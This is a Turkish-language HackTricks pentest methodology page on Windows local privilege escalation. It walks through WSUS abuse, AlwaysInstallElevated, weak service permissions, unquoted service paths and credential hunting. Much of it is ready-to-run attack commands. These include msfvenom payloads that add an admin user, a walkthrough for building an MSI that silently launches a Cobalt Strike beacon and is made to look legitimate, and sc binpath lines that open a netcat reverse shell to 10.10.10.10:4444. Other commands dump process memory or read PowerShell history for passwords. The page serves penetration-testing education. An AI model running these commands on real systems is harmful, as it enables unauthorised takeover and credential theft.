# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **En iyi araç Windows local privilege escalation vectors için:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows - Temel Teori

### Access Tokens

**Eğer Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı inceleyin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Eğer Windows'taki integrity levels'ın ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistem üzerinde **prevent you from enumerating the system**, executable çalıştırmanızı veya aktivitelerinizi **detect your activities** edebilecek farklı unsurlar vardır. Privilege escalation enumeration'a başlamadan önce aşağıdaki **page**'i **read** edip bu tüm **defenses** **mechanisms**'i **enumerate** etmelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Sistem Bilgileri

### Version info enumeration

Windows sürümünün bilinen bir vulnerability'si olup olmadığını kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik zafiyetleri hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik zafiyeti bulunuyor; bu, bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü)_

**Sistem bilgisi ile yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits için Github repoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Herhangi bir credential/Juicy bilgi env değişkenlerinde kayıtlı mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betik parçalarını kapsar. Ancak tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik çalıştırmasının tam etkinlik ve içerik kaydı yakalanır; bu, her kod bloğunun çalıştırılırken belgelenmesini sağlar. Bu süreç, adli incelemeler ve kötü niyetli davranışların analizinde değerli olan her etkinliğin kapsamlı bir denetim izini korur. Yürütme sırasında tüm etkinliklerin belgelenmesiyle sürece ilişkin ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için olay kayıtları Windows Olay Görüntüleyicisi'nde şu yol altında bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\  
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http ile talep ediliyorsa sistemi ele geçirebilirsiniz.

İlk olarak ağın non-SSL WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakini çalıştırın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakiler:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Böyle bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 1'e eşitse.

O zaman, **istismar edilebilir.** Son kayıt 0'a eşitse, WSUS girdisi yok sayılacaktır.

Bu zafiyetleri istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — Bunlar, non-SSL WSUS trafiğine 'sahte' güncellemeler enjekte etmek için MiTM olarak silahlandırılmış exploit betikleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın istismar ettiği kusur şudur:

> Eğer yerel kullanıcı proxy'mizi değiştirme gücüne sahipsek ve Windows Updates Internet Explorer’ın ayarlarında yapılandırılmış proxy'yi kullanıyorsa, o zaman kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş kullanıcı olarak kod çalıştırmak için yerel olarak [PyWSUS](https://github.com/GoSecure/pywsus) çalıştırma gücüne de sahibiz.
>
> Ayrıca, WSUS servisi geçerli kullanıcının ayarlarını kullandığı için, onun sertifika deposunu da kullanacaktır. WSUS hostname'i için self-signed bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabileceğiz. WSUS, sertifikada trust-on-first-use tipi bir doğrulamayı uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir ve doğru hostname'e sahipse, servis tarafından kabul edilecektir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracı ile istismar edebilirsiniz (bir kez serbest bırakıldığında).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok kurumsal agent localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment saldırgan bir sunucuya zorlanabiliyorsa ve updater rogue root CA veya zayıf imzacı kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisi tarafından kurulacak kötü amaçlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için buraya bakın:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** zafiyeti mevcuttur. Bu koşullar arasında **LDAP signing'ın uygulanmaması,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren kendi haklarına sahip olmaları ve kullanıcıların domain içinde bilgisayar oluşturma yeteneği bulunması yer alır. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını belirtmek önemlidir.

Exploit'i şurada bulun: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için şu adresi inceleyin: https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/

## AlwaysInstallElevated

**Eğer** bu 2 kayıt anahtarı **etkinse** (değer **0x1** ise), herhangi bir ayrıcalığa sahip kullanıcılar NT AUTHORITY\\**SYSTEM** olarak `*.msi` dosyalarını **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Mevcut dizin içinde ayrıcalıkları yükseltmek için power-up içinden `Write-UserAddMSI` komutunu kullanarak bir Windows MSI ikili dosyası oluşturun. Bu script, kullanıcı/grup ekleme isteyen ön-derlenmiş bir MSI yükleyicisi yazar (bu nedenle GUI erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Sadece oluşturulan binary'i çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu öğreticiyi okuyarak bu araçları kullanarak bir MSI wrapper nasıl oluşturacağınızı öğrenin. Sadece komut satırlarını çalıştırmak istiyorsanız bir "**.bat**" dosyasını sarabilirsiniz.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Oluşturun** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- **Visual Studio**'u açın, **Create a new project**'ü seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye bir isim verin, örneğin **AlwaysPrivesc**, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory**'i seçin ve **Create**'e tıklayın.
- Dahil edilecek dosyaları seçtiğiniz adım 3/4'e gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** içinde **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
- Yüklenen uygulamanın daha meşru görünmesini sağlamak için değiştirebileceğiniz **Author** ve **Manufacturer** gibi diğer özellikler vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload'unun çalıştırılmasını sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, projeyi build edin.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının arka planda yüklemesini gerçekleştirmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti sömürmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Dedektörler

### Denetim Ayarları

Bu ayarlar hangi bilgilerin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is designed for the **management of local Administrator passwords**, ensuring that each password is **unique, randomised, and regularly updated** on computers joined to a domain. Bu parolalar Active Directory içinde güvenli bir şekilde depolanır ve yalnızca ACLs aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; yetkili olduklarında yerel admin parolalarını görüntülemelerine olanak tanır.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

If active, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**WDigest hakkında daha fazla bilgi bu sayfada**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile başlayarak, Microsoft Local Security Authority (LSA) için geliştirilmiş bir koruma tanıttı; bu, güvensiz süreçlerin belleğini **okuma** veya kod enjekte etme girişimlerini **engelleyerek** sistemi daha da güvenli hale getirir.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash gibi saldırılara karşı korumaktır.| [**Credentials Guard hakkında daha fazla bilgi.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** doğrulama işlemi **Local Security Authority** (LSA) tarafından yapılır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının logon data'sı kayıtlı bir security package tarafından doğrulandığında, kullanıcı için domain credentials genellikle oluşturulur.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı gruplara üye iseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunların nasıl kötüye kullanılacağını öğrenmek için buraya bakın:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Daha fazla bilgi edinin** bu sayfada bir **token**'ın ne olduğunu öğrenmek için: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfaya bakın, **ilginç token'lar** ve bunların nasıl kötüye kullanılacağını öğrenmek için:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panodaki içeriği al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Her şeyden önce süreçleri listeleyin ve **sürecin komut satırında parolaları kontrol edin**.\
Çalışan bazı binary'leri **üzerine yazıp yazamayacağınızı** veya binary klasöründe yazma izninizin olup olmadığını kontrol edin; böylece olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismar edilebilir:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) var mı diye kontrol edin.

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreç binary'lerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals'tan **procdump** kullanarak çalışan bir process'in memory dump'ını oluşturabilirsiniz. FTP gibi servisler bellekte **credentials in clear text in memory** içerir; belleği dump'lamayı deneyin ve credentials'ları okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD açmasına veya dizinlerde gezmesine izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Hizmetler

Service Triggers, belirli koşullar oluştuğunda (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.) Windows'un bir service'i başlatmasına izin verir. SERVICE_START rights'e sahip olmasanız bile genellikle tetiklerini ateşleyerek privileged services'leri başlatabilirsiniz. Enumerasyon ve aktivasyon teknikleri için bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servisin gerektirdiği ayrıcalık seviyesini kontrol etmek için _Sysinternals_'ten temin edilen **accesschk** binary'sine sahip olunması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir servisi değiştirebilip değiştiremeyeceğini kontrol etmek önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Eğer bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_Servis başlatılamıyor; ya devre dışı bırakılmış ya da ilişkilendirilmiş etkin bir aygıtı yok._

Bunu etkinleştirmek için şu komutu kullanabilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Başka bir çözüm** bu sorunun şu komutu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis binary yolunu değiştir**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu durumda, servisin çalıştırılabilir binary'sinin değiştirilmesi mümkündür. Değiştirmek ve çalıştırmak için **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını etkinleştirir; bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinimine ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini miras alır.
- **GENERIC_ALL**: Yine servis yapılandırmalarını değiştirme yeteneğini miras alır.

Bu zafiyetin tespiti ve sömürüsü için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

**Bir servisin çalıştırdığı binary'yi değiştirebilip değiştiremeyeceğinizi** veya binary'nin bulunduğu klasörde **yazma izniniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)).\
Bir servis tarafından çalıştırılan her ikili dosyayı **wmic** ile (system32'de değil) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defterini değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol edebilirsiniz**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Servis kayıt defteri AppendData/AddSubdirectory izinleri

Eğer bir registry üzerinde bu izne sahipseniz bu, **bu kayıttan alt kayıtlar oluşturabileceğiniz** anlamına gelir. Windows servisleri durumunda bu **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Tırnak içinde olmayan servis yolları

Yürütülebilir bir dosyanın yolu tırnak içinde değilse, Windows boşluktan önceki her bir kısmı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şu dosyaları çalıştırmayı dener:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak işareti içermeyen tüm servis yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti tespit edebilir ve exploit edebilirsiniz** metasploit ile: `exploit/windows/local/trusted_service_path` Manuel olarak metasploit ile bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir servis başarısız olduğunda alınacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'i gösterecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla detay için [resmi dokümantasyona](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Uygulamalar

### Yüklü Uygulamalar

Kontrol edin **binaries izinleri** (belki birini üzerine yazarak privilege escalation sağlayabilirsiniz) ve **klasörlerin** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bir konfigürasyon dosyasını değiştirip özel bir dosyayı okuyup okuyamayacağınızı veya Administrator hesabı tarafından çalıştırılacak bir binary'i (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
